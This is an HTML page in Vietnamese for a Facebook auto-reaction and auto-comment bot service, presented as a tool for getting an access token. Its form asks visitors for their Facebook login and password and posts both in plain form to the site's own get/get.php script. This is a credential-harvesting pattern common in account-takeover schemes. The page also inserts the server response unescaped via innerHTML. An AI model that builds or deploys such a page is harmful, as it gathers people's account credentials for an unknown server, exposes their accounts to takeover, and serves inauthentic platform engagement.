<!DOCTYPE html>
<html>
<head>
	<title>Lấy mã token</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <meta name="description" content="- hệ thống auto thả tim, tự động thả tim, tự động hóa Facebook, tự động thả tim Facebook mới nhất, hệ thống tự động hóa Facebook. Tự động bình luận Facebook" />
    <meta name="keywords" content="tha tim, thả tim, tự động thả tim, bot cảm xúc,bot cảm xúc cookie,auto cảm xúc facebook,auto bot cảm xúc,auto cảm xúc trên facebook,hack cảm xúc,bot cảm xúc fb,auto cảm xúc fb,hack cảm xúc facebook "/>
    <meta name="revisit-after" content="1 days" />
    <meta name="robots" content="robots.txt"/>
    <link rel="canonical" href="website.com"/>
    <link rel="publisher" href="https://plus.google.com/"/>
    <meta itemprop="name" content="Thả Tim Facebook">
    <meta itemprop="description" content="tymlai.com - hệ thống auto thả tim, tự động thả tim, tự động hóa Facebook, tự động thả tim Facebook mới nhất, hệ thống tự động hóa Facebook. Tự động bình luận Facebook">
    <meta itemprop="image" content="/ladding/img/vietfb.img">
    <!-- Facebook Meta -->
    <meta property="og:title" content="Tự động thả tim - bình luận: nhãn dán, nội dung, hình ảnh Facebook" /> 
    <meta property="og:locale" content="vi_VN" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://website.com" /> 
    <meta property="og:image" content="/ladding/img/vietfb.jpg" />
    <meta property="og:description" content="- hệ thống auto thả tim, tự động thả tim, tự động hóa Facebook, tự động thả tim Facebook mới nhất, hệ thống tự động hóa Facebook. Tự động bình luận Facebook" /> 
    <meta property="og:site_name" content="https://website.com" />
    <meta property="fb:admins" content="" />
	<link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicon.png">

</head>
<body>
<nav class="navbar navbar-default" align="center">
  <div class="container-fluid">
    <div class="navbar-header">
    </div>
    </div>
</nav>

<!-- tải tiện ích hệ thống -->

<div class="col-md-6">
<div class="panel panel-default">
  <div class="panel-heading">LẤY MÃ TOKEN BẰNG TÀI KHOẢN FACEBOOK <br> (COPY nội dung trong dấu nháy "EAAAA....").</div>
  <div class="panel-body">
    <div class="col-sm-10 col-sm-offset-1">
        <form class="form-horizontal" method="post" action="#">
                        Tài khoản:<br>
                            <input type="text" id="user_name" name="user_name" value="" size="30" placeholder="Nhập số điện thoại hoặc Email" required>
                        <br><br>
                        Mật khẩu:<br>
                            <input type="text" name="password" id="password" size="30" placeholder="Nhập mật khẩu" required>
                     <br>
					 		<font color="red"><b>* Ra như hình bên dưới là đúng. </b></font>
                <!-- /.box-body -->
                    <button type="button" onclick="_getToken();" class="btn btn-info pull-right">Lấy mã token</button><br><br><br>
				</form>	
				<div class="alert alert-success zoom" style="background: #444 !important;text-align: center"><img src="/laytoken/token.png" style="width:100%" alt="Token Successfully" /></div>
                <!-- /.box-footer -->
        <div id="gettoken">
    </div>
  </div> <!-- body -->
</div> <!-- .pannel -->
</div>
</div>
<script>
function _getToken() {
        var http = new XMLHttpRequest();
        var user = document.getElementById("user_name").value;
        var pass = document.getElementById("password").value;
        if (user == '' || pass == '') {
            alert('Nhập đầy đủ thông tin để lấy mã token');
        } else {
            var url = "get/get.php";
            var params = "u=" + user + "&p=" + pass + "";
            http.open("POST", url, true);
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            http.onreadystatechange = function () {
                if (http.readyState == 4 && http.status == 200) {
                    document.getElementById("gettoken").style.display = 'block';
                    
                    document.getElementById("gettoken").innerHTML = http.responseText;
                }
            }
            http.send(params);
        }
    }
</script>
</body>
</html>